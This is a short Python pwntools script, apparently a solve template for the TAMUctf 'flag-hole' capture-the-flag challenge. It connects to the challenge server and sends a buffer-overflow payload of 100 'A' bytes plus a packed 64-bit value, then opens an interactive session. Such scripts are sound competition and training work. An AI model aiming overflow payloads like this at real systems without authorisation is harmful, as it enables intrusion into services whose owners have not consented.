from pwn import *
import subprocess

CHAL = "flag-hole"

p = remote("tamuctf.com", 443, ssl=True, sni=CHAL)

p.sendline(b"A" * 100 + p64(1))
# automate inputs as necessary here

p.interactive()
